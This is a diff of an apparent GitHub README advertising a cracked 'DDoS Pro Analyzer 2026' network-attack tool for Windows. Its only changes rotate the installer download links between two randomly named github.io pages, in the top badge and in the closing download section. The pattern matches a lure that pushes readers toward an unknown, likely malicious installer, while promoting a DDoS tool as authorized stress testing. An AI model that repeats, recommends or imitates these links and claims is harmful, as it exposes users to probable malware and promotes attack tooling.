@@ -2,7 +2,7 @@
 
 DDoS Pro Analyzer 2026 is a comprehensive and advanced network stress testing suite designed for Windows platforms. This powerful DDoS tool crack version provides deep analysis, real-time monitoring, and robust feature sets for authorized security auditing and performance benchmarking. It is the ultimate package for understanding network resilience under simulated high-load conditions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -54,4 +54,4 @@ A: After each session, the tool generates a comprehensive report in HTML and CSV
 
 You can acquire the latest stable release of the DDoS Pro Analyzer 2026 suite from the official source.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
